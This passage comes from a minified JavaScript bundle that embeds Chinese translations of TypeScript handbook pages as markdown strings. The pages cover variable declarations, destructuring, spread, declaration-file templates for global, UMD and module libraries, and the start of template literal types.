{console.log(i); }, 100 * i);\n}\n```\n\n会输出与预料一致的结果：\n\n```text\n0\n1\n2\n3\n4\n5\n6\n7\n8\n9\n```\n\n## `const` 声明\n\n`const` 声明是声明变量的另一种方式。\n\n```typescript\nconst numLivesForCat = 9;\n```\n\n它们与`let`声明相似，但是就像它的名字所表达的，它们被赋值后不能再改变。 换句话说，它们拥有与`let`相同的作用域规则，但是不能对它们重新赋值。\n\n这很好理解，它们引用的值是_不可变的_。\n\n```typescript\nconst numLivesForCat = 9;\nconst kitty = {\n    name: "Aurora",\n    numLives: numLivesForCat,\n}\n\n// Error\nkitty = {\n    name: "Danielle",\n    numLives: numLivesForCat\n};\n\n// all "okay"\nkitty.name = "Rory";\nkitty.name = "Kitty";\nkitty.name = "Cat";\nkitty.numLives--;\n```\n\n除非你使用特殊的方法去避免，实际上`const`变量的内部状态是可修改的。 幸运的是，TypeScript允许你将对象的成员设置成只读的。 [接口](interfaces.md)一章有详细说明。\n\n## `let` vs. `const`\n\n现在我们有两种作用域相似的声明方式，我们自然会问到底应该使用哪个。 与大多数泛泛的问题一样，答案是：依情况而定。\n\n使用[最小特权原则](https://en.wikipedia.org/wiki/Principle_of_least_privilege)，所有变量除了你计划去修改的都应该使用`const`。 基本原则就是如果一个变量不需要对它写入，那么其它使用这些代码的人也不能够写入它们，并且要思考为什么会需要对这些变量重新赋值。 使用`const`也可以让我们更容易的推测数据的流动。\n\n跟据你的自己判断，如果合适的话，与团队成员商议一下。\n\n这个手册大部分地方都使用了`let`声明。\n\n## 解构\n\nTypeScript 包含的另一个 ECMAScript 2015 特性就是解构。完整列表请参见 [the article on the Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment)。 本章，我们将给出一个简短的概述。\n\n### 解构数组\n\n最简单的解构莫过于数组的解构赋值了：\n\n```typescript\nlet input = [1, 2];\nlet [first, second] = input;\nconsole.log(first); // outputs 1\nconsole.log(second); // outputs 2\n```\n\n这创建了2个命名变量 `first` 和 `second`。 相当于使用了索引，但更为方便：\n\n```typescript\nfirst = input[0];\nsecond = input[1];\n```\n\n解构也可以作用于已声明的变量：\n\n```typescript\n// swap variables\n[first, second] = [second, first];\n```\n\n类似地，也可以作用于函数参数：\n\n```typescript\nfunction f([first, second]: [number, number]) {\n    console.log(first);\n    console.log(second);\n}\nf([1, 2]);\n```\n\n你可以在数组里使用`...`语法创建剩余变量：\n\n```typescript\nlet [first, ...rest] = [1, 2, 3, 4];\nconsole.log(first); // outputs 1\nconsole.log(rest); // outputs [ 2, 3, 4 ]\n```\n\n当然，由于是JavaScript, 你可以忽略你不关心的尾随元素：\n\n```typescript\nlet [first] = [1, 2, 3, 4];\nconsole.log(first); // outputs 1\n```\n\n或其它元素：\n\n```typescript\nlet [, second, , fourth] = [1, 2, 3, 4];\nconsole.log(second); // outputs 2\nconsole.log(fourth); // outputs 4\n```\n\n### 解构元组\n\n元组可以像数组一样解构；解构后的变量获得对应元组元素的类型：\n\n```typescript\nlet tuple: [number, string, boolean] = [7, "hello", true];\n\nlet [a, b, c] = tuple; // a: number, b: string, c: boolean\n```\n\n当解构元组时，若超出元组索引范围将报错：\n\n```typescript\nlet [a, b, c, d] = tuple; // 错误，没有索引为3的元素\n```\n\n与数组一样，可以作用`...`来解构元组的剩余元素，从而得到一个短的元组：\n\n```typescript\nlet [a, ...bc] = tuple; // bc: [string, boolean]\nlet [a, b, c, ...d] = tuple; // d: [], the empty tuple\n```\n\n或者，忽略末尾元素或其它元素：\n\n```typescript\nlet [a] = tuple; // a: number\nlet [, b] = tuple; // b: string\n```\n\n### 对象解构\n\n你也可以解构对象：\n\n```typescript\nlet o = {\n    a: "foo",\n    b: 12,\n    c: "bar"\n};\nlet { a, b } = o;\n```\n\n这通过 `o.a` and `o.b` 创建了 `a` 和 `b` 。 注意，如果你不需要 `c` 你可以忽略它。\n\n就像数组解构，你可以用没有声明的赋值：\n\n```typescript\n({ a, b } = { a: "baz", b: 101 });\n```\n\n注意，我们需要用括号将它括起来，因为Javascript通常会将以 `{` 起始的语句解析为一个块。\n\n你可以在对象里使用`...`语法创建剩余变量：\n\n```typescript\nlet { a, ...passthrough } = o;\nlet total = passthrough.b + passthrough.c.length;\n```\n\n#### 属性重命名\n\n你也可以给属性以不同的名字：\n\n```typescript\nlet { a: newName1, b: newName2 } = o;\n```\n\n这里的语法开始变得混乱。 你可以将 `a: newName1` 读做 "`a` 作为 `newName1`"。 方向是从左到右，好像你写成了以下样子：\n\n```typescript\nlet newName1 = o.a;\nlet newName2 = o.b;\n```\n\n令人困惑的是，这里的冒号_不是_指示类型的。 如果你想指定它的类型， 仍然需要在其后写上完整的模式。\n\n```typescript\nlet {a, b}: {a: string, b: number} = o;\n```\n\n#### 默认值\n\n我们可以为属性指定一个默认值，当属性值为`undefined`时，将使用该默认值：\n\n```typescript\nfunction keepWholeObject(wholeObject: { a: string, b?: number }) {\n    let { a, b = 1001 } = wholeObject;\n}\n```\n\n此例中，`b?`表明`b`是可选的，因此它可能为`undefined`。 现在，即使 `b` 为 undefined ， `keepWholeObject` 函数的变量 `wholeObject` 的属性 `a` 和 `b` 都会有值。\n\n### 函数声明\n\n解构也能用于函数声明。 看以下简单的情况：\n\n```typescript\ntype C = { a: string, b?: number }\nfunction f({ a, b }: C): void {\n    // ...\n}\n```\n\n但是，通常情况下更多的是指定默认值，解构默认值有些棘手。 首先，你需要在默认值之前设置其格式。\n\n```typescript\nfunction f({ a="", b=0 } = {}): void {\n    // ...\n}\nf();\n```\n\n> 上面的代码是一个类型推断的例子，将在本手册后文介绍。\n\n其次，你需要知道在解构属性上给予一个默认或可选的属性用来替换主初始化列表。 要知道 `C` 的定义有一个 `b` 可选属性：\n\n```typescript\nfunction f({ a, b = 0 } = { a: "" }): void {\n    // ...\n}\nf({ a: "yes" }); // ok, default b = 0\nf(); // ok, default to {a: ""}, which then defaults b = 0\nf({}); // error, \'a\' is required if you supply an argument\n```\n\n要小心使用解构。 从前面的例子可以看出，就算是最简单的解构表达式也是难以理解的。 尤其当存在深层嵌套解构的时候，就算这时没有堆叠在一起的重命名，默认值和类型注解，也是令人难以理解的。 解构表达式要尽量保持小而简单。 你自己也可以直接使用解构将会生成的赋值表达式。\n\n### 展开\n\n展开操作符正与解构相反。 它允许你将一个数组展开为另一个数组，或将一个对象展开为另一个对象。 例如：\n\n```typescript\nlet first = [1, 2];\nlet second = [3, 4];\nlet bothPlus = [0, ...first, ...second, 5];\n```\n\n这会令`bothPlus`的值为`[0, 1, 2, 3, 4, 5]`。 展开操作创建了`first`和`second`的一份浅拷贝。 它们不会被展开操作所改变。\n\n你还可以展开对象：\n\n```typescript\nlet defaults = { food: "spicy", price: "$$", ambiance: "noisy" };\nlet search = { ...defaults, food: "rich" };\n```\n\n`search`的值为`{ food: "rich", price: "$$", ambiance: "noisy" }`。 对象的展开比数组的展开要复杂的多。 像数组展开一样，它是从左至右进行处理，但结果仍为对象。 这就意味着出现在展开对象后面的属性会覆盖前面的属性。 因此，如果我们修改上面的例子，在结尾处进行展开的话：\n\n```typescript\nlet defaults = { food: "spicy", price: "$$", ambiance: "noisy" };\nlet search = { food: "rich", ...defaults };\n```\n\n那么，`defaults`里的`food`属性会重写`food: "rich"`，在这里这并不是我们想要的结果。\n\n对象展开还有其它一些意想不到的限制。 首先，它仅包含对象 [自身的可枚举属性](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Enumerability_and_ownership_of_properties)。 大体上是说当你展开一个对象实例时，你会丢失其方法：\n\n```typescript\nclass C {\n  p = 12;\n  m() {\n  }\n}\nlet c = new C();\nlet clone = { ...c };\nclone.p; // ok\nclone.m(); // error!\n```\n\n其次，TypeScript编译器不允许展开泛型函数上的类型参数。 这个特性会在TypeScript的未来版本中考虑实现。\n\n',Il={data:function(){return{MainComponent1:Sl,MainComponent2:yl,MainComponent3:fl,MainComponent4:_l,MainComponent5:xl,MainComponent6:wl,MainComponent7:El,MainComponent8:Tl,MainComponent9:kl,MainComponent10:Cl,MainComponent11:jl,MainComponent12:Ml,MainComponent13:Rl,MainComponent14:Ll,MainComponent15:Ol,MainComponent16:Al}}},Dl=Il,Pl=Object(u["a"])(Dl,vl,hl,!1,null,"6a0fbfd5",null),Nl=Pl.exports,ql=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}}),t("q-markdown",{attrs:{src:n.MainComponent3}}),t("q-markdown",{attrs:{src:n.MainComponent4}}),t("q-markdown",{attrs:{src:n.MainComponent5}}),t("q-markdown",{attrs:{src:n.MainComponent6}}),t("q-markdown",{attrs:{src:n.MainComponent7}})],1)},Hl=[],Bl="# global-modifying-module.d.ts\n\n## 修改了全局作用域的模块\n\n对于修改了全局作用域的模块来讲，在导入它们时，会对全局作用域中的值进行修改。\n比如存在某个代码库，当导入它时，它会向`String.prototype`上添加新的成员。\n该模式存在危险，因为它有导致运行时冲突的可能性，\n但我们仍然可以为其编写声明文件。\n\n## 识别出修改了全局作用域的模块\n\n我们可以通过文档来识别修改了全局作用域的模块。\n通常来讲，它们与全局插件类似，但是需要`require`语句来激活。\n\n你可能看到过如下的文档：\n\n```js\n// 'require' call that doesn't use its return value\nvar unused = require('magic-string-time');\n/* or */\nrequire('magic-string-time');\n\nvar x = 'hello, world';\n// Creates new methods on built-in types\nconsole.log(x.startsWithHello());\n\nvar y = [1, 2, 3];\n// Creates new methods on built-in types\nconsole.log(y.reverseAndSort());\n```\n\n以下是一个示例：\n\n```ts\n// Type definitions for [~THE LIBRARY NAME~] [~OPTIONAL VERSION NUMBER~]\n// Project: [~THE PROJECT NAME~]\n// Definitions by: [~YOUR NAME~] <[~A URL FOR YOU~]>\n\n/*~ This is the global-modifying module template file. You should rename it to index.d.ts\n *~ and place it in a folder with the same name as the module.\n *~ For example, if you were writing a file for \"super-greeter\", this\n *~ file should be 'super-greeter/index.d.ts'\n */\n\n/*~ Note: If your global-modifying module is callable or constructable, you'll\n *~ need to combine the patterns here with those in the module-class or module-function\n *~ template files\n */\ndeclare global {\n    /*~ Here, declare things that go in the global namespace, or augment\n     *~ existing declarations in the global namespace\n     */\n    interface String {\n        fancyFormat(opts: StringFormatOptions): string;\n    }\n}\n\n/*~ If your module exports types or values, write them as usual */\nexport interface StringFormatOptions {\n    fancinessLevel: number;\n}\n\n/*~ For example, declaring a method on the module (in addition to its global side effects) */\nexport function doSomething(): void;\n\n/*~ If your module exports nothing, you'll need this line. Otherwise, delete it */\nexport {};\n```\n",Fl="# global-plugin.d.ts\n\n## UMD\n\n一个 UMD 模块既可以用作 ES 模块（使用导入语句），也可以用作全局变量（在缺少模块加载器的环境中使用）。\n许多流行的代码库，如[Moment.js](http://momentjs.com/)，都是使用这模式发布的。\n例如，在 Node.js 中或使用了 RequireJS 时，你可以这样使用：\n\n```ts\nimport moment = require('moment');\nconsole.log(moment.format());\n```\n\n在纯浏览器环境中，你可以这样使用：\n\n```js\nconsole.log(moment.format());\n```\n\n### 识别 UMD 代码库\n\n[UMD 模块](https://github.com/umdjs/umd)会检查运行环境中是否存在模块加载器。\n这是一种常见模式，示例如下：\n\n```js\n(function (root, factory) {\n    if (typeof define === \"function\" && define.amd) {\n        define([\"libName\"], factory);\n    } else if (typeof module === \"object\" && module.exports) {\n        module.exports = factory(require(\"libName\"));\n    } else {\n        root.returnExports = factory(root.libName);\n    }\n}(this, function (b) {\n```\n\n如果你看到代码库中存在类如`typeof define`，`typeof window`或`typeof module`的检测代码，尤其是在文件的顶端，那么它大概率是 UMD 代码库。\n\n在 UMD 模块的文档中经常会提供在 Node.js 中结合`require`使用的示例，以及在浏览器中结合`<script>`标签使用的示例。\n\n### UMD 代码库的示例\n\n大多数流行的代码库均提供了 UMD 格式的包。\n例如，[jQuery](https://jquery.com/)，[Moment.js](http://momentjs.com/)和[lodash](https://lodash.com/)等。\n\n### 模版\n\n针对模块，共存在三个模版。它们是：\n\n-   [`module.d.ts`](./templates/module.d.ts.md)\n-   [`module-class.d.ts`](./templates/module-class.d.ts.md)\n-   [`module-function.d.ts`](./templates/module-function.d.ts.md)\n\n若一个模块可以当作函数调用，则使用[`module-function.d.ts`](./templates/module-function.d.ts.md)。\n\n```js\nvar x = require('foo');\n// Note: calling 'x' as a function\nvar y = x(42);\n```\n\n请务必阅读[脚注：\"ES6 对模块调用签名的影响\"](#es6-对模块调用签名的影响)。\n\n如果一个模块可以使用`new`来构造，则使用[`module-class.d.ts`](./templates/module-class.d.ts.md)。\n\n```js\nvar x = require('bar');\n// Note: using 'new' operator on the imported variable\nvar y = new x('hello');\n```\n\n请务必阅读[脚注：\"ES6 对模块调用签名的影响\"](#es6-对模块调用签名的影响)，它同样适用于这类模块。\n\n如果一个模块既不可以调用，又不可以构造，那么就使用[`module.d.ts`](./templates/module.d.ts.md)。\n\n## 模块插件或 UMD 插件\n\n模块插件会改变其它模块的结构（包含 UMD 或 ES 模块）。\n例如，在 Moment.js 中，`moment-range`会将`range`方法添加到`moment`对象上。\n\n对于编写声明文件而言，无论是 ES 模块还是 UMD 模块，你都可以使用相同的代码。\n\n### 模版\n\n使用[`module-plugin.d.ts`](./templates/module-plugin.d.ts.md)模版。\n\n## 全局插件\n\n全局插件是一段全局代码，它会改变某个全局变量。\n对于修改了全局作用域的模块，它会增加出现运行时冲突的可能性。\n\n例如，有些库会向`Array.prototype`或`String.prototype`中增加新的函数。\n\n### 识别全局插件\n\n全局插件通常可以根据其文档来识别。\n\n你会看到如下示例：\n\n```js\nvar x = 'hello, world';\n// Creates new methods on built-in types\nconsole.log(x.startsWithHello());\n\nvar y = [1, 2, 3];\n// Creates new methods on built-in types\nconsole.log(y.reverseAndSort());\n```\n\n### 模版\n\n使用[`global-plugin.d.ts`](./templates/global-plugin.d.ts.md)模版。\n\n## 修改了全局作用域的模块\n\n对于修改了全局作用域的模块来讲，在导入它们时，会对全局作用域中的值进行修改。\n比如存在某个代码库，当导入它时，它会向`String.prototype`上添加新的成员。\n该模式存在危险，因为它有导致运行时冲突的可能性，\n但我们仍然可以为其编写声明文件。\n\n### 识别出修改了全局作用域的模块\n\n我们可以通过文档来识别修改了全局作用域的模块。\n通常来讲，它们与全局插件类似，但是需要`require`语句来激活对全局作用域的修改。\n\n你可能看到过如下的文档：\n\n```js\n// 'require' call that doesn't use its return value\nvar unused = require('magic-string-time');\n/* or */\nrequire('magic-string-time');\n\nvar x = 'hello, world';\n// Creates new methods on built-in types\nconsole.log(x.startsWithHello());\n\nvar y = [1, 2, 3];\n// Creates new methods on built-in types\nconsole.log(y.reverseAndSort());\n```\n\n### 模版\n\n使用[`global-modifying-module.d.ts`](./templates/global-modifying-module.d.ts.md)模版。\n\n## 利用依赖\n\n你的代码库可能会有若干种依赖。\n本节会介绍如何在声明文件中导入它们。\n\n### 对全局库的依赖\n\n如果你的代码库依赖于某个全局代码库，则使用`/// <reference types=\"...\" />`指令：\n\n```ts\n/// <reference types=\"someLib\" />\n\nfunction getThing(): someLib.thing;\n```\n\n### 对模块的依赖\n\n如果你的代码库依赖于某个模块，则使用`import`语句：\n\n```ts\nimport * as moment from 'moment';\n\nfunction getThing(): moment;\n```\n\n### 对 UMD 模块的依赖\n\n#### 全局代码库\n\n如果你的全局代码库依赖于某个 UMD 模块，则使用`/// <reference types`指令：\n\n```ts\n/// <reference types=\"moment\" />\n\nfunction getThing(): moment;\n```\n\n#### ES 模块或 UMD 模块代码库\n\n如果你的模块或 UMD 代码库依赖于某个 UMD 代码库，则使用`import`语句：\n\n```ts\nimport * as someLib from 'someLib';\n```\n\n不要使用`/// <reference`指令来声明对 UMD 代码库的依赖。\n\n## 脚注\n\n### 防止命名冲突\n\n注意，虽说可以在全局作用域内定义许多类型。\n但我们强烈建议不要这样做，因为当一个工程中存在多个声明文件时，它可能会导致难以解决的命名冲突。\n\n可以遵循的一个简单规则是使用代码库提供的某个全局变量来声明拥有命名空间的类型。\n例如，如果代码库提供了全局变量`cats`，那么可以这样写：\n\n```ts\ndeclare namespace cats {\n    interface KittySettings {}\n}\n```\n\n而不是：\n\n```ts\n// at top-level\ninterface CatsKittySettings {}\n```\n\n这样做会保证代码库可以被转换成 UMD 模块，且不会影响声明文件的使用者。\n\n### ES6 对模块插件的影响\n\n一些插件会对已有模块的顶层导出进行添加或修改。\n这在 CommonJS 以及其它模块加载器里是合法的，但 ES6 模块是不可改变的，因此该模式是不可行的。\n因为，TypeScript 是模块加载器无关的，所以在编译时不会对该行为加以限制，但是开发者若想要转换到 ES6 模块加载器则需要注意这一点。\n\n### ES6 对模块调用签名的影响\n\n许多代码库，如 Express，将自身导出为可调用的函数。\n例如，Express 的典型用法如下：\n\n```ts\nimport exp = require('express');\nvar app = exp();\n```\n\n在 ES6 模块加载器中，顶层对象（此例中就`exp`）只能拥有属性；\n顶层的模块对象永远不能够被调用。\n最常见的解决方案是为可调用的/可构造的对象定义一个`default`导出；\n有些模块加载器会自动检测这种情况并且将顶层对象替换为`default`导出。\n\n## 代码库文件结构\n\n声明文件的结构应该反映代码库源码的结构。\n\n一个代码库可以包含多个模块，比如：\n\n```\nmyLib\n  +---- index.js\n  +---- foo.js\n  +---- bar\n         +---- index.js\n         +---- baz.js\n```\n\n它们可以通过如下方式导入：\n\n```js\nvar a = require('myLib');\nvar b = require('myLib/foo');\nvar c = require('myLib/bar');\nvar d = require('myLib/bar/baz');\n```\n\n声明文件如下：\n\n```\n@types/myLib\n  +---- index.d.ts\n  +---- foo.d.ts\n  +---- bar\n         +---- index.d.ts\n         +---- baz.d.ts\n```\n\n```ts\n// Type definitions for [~THE LIBRARY NAME~] [~OPTIONAL VERSION NUMBER~]\n// Project: [~THE PROJECT NAME~]\n// Definitions by: [~YOUR NAME~] <[~A URL FOR YOU~]>\n\n/*~ This template shows how to write a global plugin. */\n\n/*~ Write a declaration for the original type and add new members.\n *~ For example, this adds a 'toBinaryString' method with overloads to\n *~ the built-in number type.\n */\ninterface Number {\n    toBinaryString(opts?: MyLibrary.BinaryFormatOptions): string;\n\n    toBinaryString(\n        callback: MyLibrary.BinaryFormatCallback,\n        opts?: MyLibrary.BinaryFormatOptions\n    ): string;\n}\n\n/*~ If you need to declare several types, place them inside a namespace\n *~ to avoid adding too many things to the global namespace.\n */\ndeclare namespace MyLibrary {\n    type BinaryFormatCallback = (n: number) => string;\n    interface BinaryFormatOptions {\n        prefix?: string;\n        padding: number;\n    }\n}\n```\n",Ul="## 全局代码库\n\n全局代码库可以通过全局作用域来访问（例如，不使用任何形式的`import`语句）。\n许多代码库只是简单地导出一个或多个供使用的全局变量。\n比如，如果你使用[jQuery](https://jquery.com/)，那么可以使用`$`变量来引用它。\n\n```ts\n$(() => {\n    console.log('hello!');\n});\n```\n\n你通常能够在文档里看到如何在 HTML 的 script 标签里引用代码库：\n\n```html\n<script src=\"http://a.great.cdn.for/someLib.js\"><\/script>\n```\n\n目前，大多数流行的全局代码库都以 UMD 代码库发布。\nUMD 代码库与全局代码库很难通过文档来识别。\n在编写全局代码库的声明文件之前，确保代码库不是 UMD 代码库。\n\n## 从代码来识别全局代码库\n\n通常，全局代码库的代码十分简单。\n一个全局的“Hello, world”代码库可以如下：\n\n```js\nfunction createGreeting(s) {\n    return 'Hello, ' + s;\n}\n```\n\n或者这样：\n\n```js\nwindow.createGreeting = function (s) {\n    return 'Hello, ' + s;\n};\n```\n\n在阅读全局代码库的代码时，你会看到：\n\n-   顶层的`var`语句或`function`声明\n-   一个或多个`window.someName`赋值语句\n-   假设 DOM 相关的原始值`document`或`window`存在\n\n你不会看到：\n\n-   检查或使用了模块加载器，如`require`或`define`\n-   CommonJS/Node.js 风格的导入语句，如`var fs = require(\"fs\");`\n-   `define(...)`调用\n-   描述`require`或导入代码库的文档\n\n## 全局代码库的示例\n\n由于将全局代码库转换为 UMD 代码库十分容易，因此很少有代码库仍然使用全局代码库风格。\n然而，小型的代码库以及需要使用 DOM 的代码库仍然可以是全局的。\n\n## 全局代码库模版\n\n你可以看到如下声明文件的示例：\n\n```ts\n// Type definitions for [~THE LIBRARY NAME~] [~OPTIONAL VERSION NUMBER~]\n// Project: [~THE PROJECT NAME~]\n// Definitions by: [~YOUR NAME~] <[~A URL FOR YOU~]>\n\n/*~ If this library is callable (e.g. can be invoked as myLib(3)),\n *~ include those call signatures here.\n *~ Otherwise, delete this section.\n */\ndeclare function myLib(a: string): string;\ndeclare function myLib(a: number): number;\n\n/*~ If you want the name of this library to be a valid type name,\n *~ you can do so here.\n *~\n *~ For example, this allows us to write 'var x: myLib';\n *~ Be sure this actually makes sense! If it doesn't, just\n *~ delete this declaration and add types inside the namespace below.\n */\ninterface myLib {\n    name: string;\n    length: number;\n    extras?: string[];\n}\n\n/*~ If your library has properties exposed on a global variable,\n *~ place them here.\n *~ You should also place types (interfaces and type alias) here.\n */\ndeclare namespace myLib {\n    //~ We can write 'myLib.timeout = 50;'\n    let timeout: number;\n\n    //~ We can access 'myLib.version', but not change it\n    const version: string;\n\n    //~ There's some class we can create via 'let c = new myLib.Cat(42)'\n    //~ Or reference e.g. 'function f(c: myLib.Cat) { ... }\n    class Cat {\n        constructor(n: number);\n\n        //~ We can read 'c.age' from a 'Cat' instance\n        readonly age: number;\n\n        //~ We can invoke 'c.purr()' from a 'Cat' instance\n        purr(): void;\n    }\n\n    //~ We can declare a variable as\n    //~   'var s: myLib.CatSettings = { weight: 5, name: \"Maru\" };'\n    interface CatSettings {\n        weight: number;\n        name: string;\n        tailLength?: number;\n    }\n\n    //~ We can write 'const v: myLib.VetID = 42;'\n    //~  or 'const v: myLib.VetID = \"bob\";'\n    type VetID = string | number;\n\n    //~ We can invoke 'myLib.checkCat(c)' or 'myLib.checkCat(c, v);'\n    function checkCat(c: Cat, s?: VetID);\n}\n```\n",Jl="\x3c!--\nTODO:\n\n1. Not clear why UMD is thrown in here.\n2. Give both commonjs and ES module examples.\n--\x3e\n\n示例，当你想要处理如下的 JavaScriptr 的代码时：\n\n```ts\nconst Greeter = require('super-greeter');\n\nconst greeter = new Greeter();\ngreeter.greet();\n```\n\n能够同时处理UMD导入和模块导入：\n\n```ts\n// Type definitions for [~THE LIBRARY NAME~] [~OPTIONAL VERSION NUMBER~]\n// Project: [~THE PROJECT NAME~]\n// Definitions by: [~YOUR NAME~] <[~A URL FOR YOU~]>\n\n/*~ This is the module template file for class modules.\n *~ You should rename it to index.d.ts and place it in a folder with the same name as the module.\n *~ For example, if you were writing a file for \"super-greeter\", this\n *~ file should be 'super-greeter/index.d.ts'\n */\n\n// Note that ES6 modules cannot directly export class objects.\n// This file should be imported using the CommonJS-style:\n//   import x = require('[~THE MODULE~]');\n//\n// Alternatively, if --allowSyntheticDefaultImports or\n// --esModuleInterop is turned on, this file can also be\n// imported as a default import:\n//   import x from '[~THE MODULE~]';\n//\n// Refer to the TypeScript documentation at\n// https://www.typescriptlang.org/docs/handbook/modules.html#export--and-import--require\n// to understand common workarounds for this limitation of ES6 modules.\n\n/*~ If this module is a UMD module that exposes a global variable 'myClassLib' when\n *~ loaded outside a module loader environment, declare that global here.\n *~ Otherwise, delete this declaration.\n */\nexport as namespace myClassLib;\n\n/*~ This declaration specifies that the class constructor function\n *~ is the exported object from the file\n */\nexport = MyClass;\n\n/*~ Write your module's methods and properties in this class */\ndeclare class MyClass {\n    constructor(customGreeting?: string);\n\n    greet: void;\n\n    myMethod(opts: MyClass.MyClassMethodOptions): number;\n}\n\n/*~ If you want to expose types from your module as well, you can\n *~ place them in this block.\n *~\n *~ Note that if you decide to include this namespace, the module can be\n *~ incorrectly imported as a namespace object, unless\n *~ --esModuleInterop is turned on:\n *~   import * as x from '[~THE MODULE~]'; // WRONG! DO NOT DO THIS!\n */\ndeclare namespace MyClass {\n    export interface MyClassMethodOptions {\n        width?: number;\n        height?: number;\n    }\n}\n```\n",zl="```ts\n// Type definitions for [~THE LIBRARY NAME~] [~OPTIONAL VERSION NUMBER~]\n// Project: [~THE PROJECT NAME~]\n// Definitions by: [~YOUR NAME~] <[~A URL FOR YOU~]>\n\n/*~ This is the module template file for function modules.\n *~ You should rename it to index.d.ts and place it in a folder with the same name as the module.\n *~ For example, if you were writing a file for \"super-greeter\", this\n *~ file should be 'super-greeter/index.d.ts'\n */\n\n// Note that ES6 modules cannot directly export class objects.\n// This file should be imported using the CommonJS-style:\n//   import x = require('[~THE MODULE~]');\n//\n// Alternatively, if --allowSyntheticDefaultImports or\n// --esModuleInterop is turned on, this file can also be\n// imported as a default import:\n//   import x from '[~THE MODULE~]';\n//\n// Refer to the TypeScript documentation at\n// https://www.typescriptlang.org/docs/handbook/modules.html#export--and-import--require\n// to understand common workarounds for this limitation of ES6 modules.\n\n/*~ If this module is a UMD module that exposes a global variable 'myFuncLib' when\n *~ loaded outside a module loader environment, declare that global here.\n *~ Otherwise, delete this declaration.\n */\nexport as namespace myFuncLib;\n\n/*~ This declaration specifies that the function\n *~ is the exported object from the file\n */\nexport = MyFunction;\n\n/*~ This example shows how to have multiple overloads for your function */\ndeclare function MyFunction(name: string): MyFunction.NamedReturnType;\ndeclare function MyFunction(length: number): MyFunction.LengthReturnType;\n\n/*~ If you want to expose types from your module as well, you can\n *~ place them in this block. Often you will want to describe the\n *~ shape of the return type of the function; that type should\n *~ be declared in here, as this example shows.\n *~\n *~ Note that if you decide to include this namespace, the module can be\n *~ incorrectly imported as a namespace object, unless\n *~ --esModuleInterop is turned on:\n *~   import * as x from '[~THE MODULE~]'; // WRONG! DO NOT DO THIS!\n */\ndeclare namespace MyFunction {\n    export interface LengthReturnType {\n        width: number;\n        height: number;\n    }\n    export interface NamedReturnType {\n        firstName: string;\n        lastName: string;\n    }\n\n    /*~ If the module also has properties, declare them here. For example,\n     *~ this declaration says that this code is legal:\n     *~   import f = require('myFuncLibrary');\n     *~   console.log(f.defaultName);\n     */\n    export const defaultName: string;\n    export let defaultLength: number;\n}\n```\n",Wl="```ts\n// Type definitions for [~THE LIBRARY NAME~] [~OPTIONAL VERSION NUMBER~]\n// Project: [~THE PROJECT NAME~]\n// Definitions by: [~YOUR NAME~] <[~A URL FOR YOU~]>\n\n/*~ This is the module plugin template file. You should rename it to index.d.ts\n *~ and place it in a folder with the same name as the module.\n *~ For example, if you were writing a file for \"super-greeter\", this\n *~ file should be 'super-greeter/index.d.ts'\n */\n\n/*~ On this line, import the module which this module adds to */\nimport * as m from 'someModule';\n\n/*~ You can also import other modules if needed */\nimport * as other from 'anotherModule';\n\n/*~ Here, declare the same module as the one you imported above */\ndeclare module 'someModule' {\n    /*~ Inside, add new function, classes, or variables. You can use\n     *~ unexported types from the original module if needed. */\n    export function theNewMethod(x: m.foo): other.bar;\n\n    /*~ You can also add new properties to existing interfaces from\n     *~ the original module by writing interface augmentations */\n    export interface SomeModuleOptions {\n        someModuleSetting?: string;\n    }\n\n    /*~ New types can also be declared and will appear as if they\n     *~ are in the original module */\n    export interface MyModulePluginOptions {\n        size: number;\n    }\n}\n```",$l="```ts\n// Type definitions for [~THE LIBRARY NAME~] [~OPTIONAL VERSION NUMBER~]\n// Project: [~THE PROJECT NAME~]\n// Definitions by: [~YOUR NAME~] <[~A URL FOR YOU~]>\n\n/*~ This is the module template file. You should rename it to index.d.ts\n *~ and place it in a folder with the same name as the module.\n *~ For example, if you were writing a file for \"super-greeter\", this\n *~ file should be 'super-greeter/index.d.ts'\n */\n\n/*~ If this module is a UMD module that exposes a global variable 'myLib' when\n *~ loaded outside a module loader environment, declare that global here.\n *~ Otherwise, delete this declaration.\n */\nexport as namespace myLib;\n\n/*~ If this module has methods, declare them as functions like so.\n */\nexport function myMethod(a: string): string;\nexport function myOtherMethod(a: number): number;\n\n/*~ You can declare types that are available via importing the module */\nexport interface someType {\n    name: string;\n    length: number;\n    extras?: string[];\n}\n\n/*~ You can declare properties of the module using const, let, or var */\nexport const myField: number;\n\n/*~ If there are types, properties, or methods inside dotted names\n *~ of the module, declare them inside a 'namespace'.\n */\nexport namespace subProp {\n    /*~ For example, given this definition, someone could write:\n     *~   import { subProp } from 'yourModule';\n     *~   subProp.foo();\n     *~ or\n     *~   import * as yourMod from 'yourModule';\n     *~   yourMod.subProp.foo();\n     */\n    export function foo(): void;\n}\n```",Gl={data:function(){return{MainComponent1:Bl,MainComponent2:Fl,MainComponent3:Ul,MainComponent4:Jl,MainComponent5:zl,MainComponent6:Wl,MainComponent7:$l}}},Vl=Gl,Ql=Object(u["a"])(Vl,ql,Hl,!1,null,"84c7327c",null),Kl=Ql.exports,Xl=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent1}}),t("q-markdown",{attrs:{src:n.MainComponent2}})],1)},Yl=[],Zl="# 模版字面量类型\n\n> 从 TypeScript 4.1 开始支持\n\n模版字面量类型以[字符串字面量类型](../../handbook/literal-types.md)为基础，且可以展开为多个字符串类型的联合类型。\n\n其语法与 [JavaScript 中的模版字面量](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals)是一致的，但是是用在类型的位置上。\n当与某个具体的字面量类型一起使用时，模版字面量会将文本连接从而生成一个新的字符串字面量类型。\n\n```ts\ntype World = 'world';\n\ntype Greeting = `hello ${World}`;\n//   'hello world'\n```\n\n如果在替换字符串的位置是联合类型，那么结果类型是由每个联合类型成员构成的字符串字面量的集合：\n\n```ts\ntype EmailLocaleIDs = 'welcome_email' | 'email_heading';\ntype FooterLocaleIDs = 'footer_title' | 'footer_sendoff';\n\ntype AllLocaleIDs = `${EmailLocaleIDs | FooterLocaleIDs}_id`;\n// \"welcome_email_id\" | \"email_heading_id\" | \"footer_title_id\" | 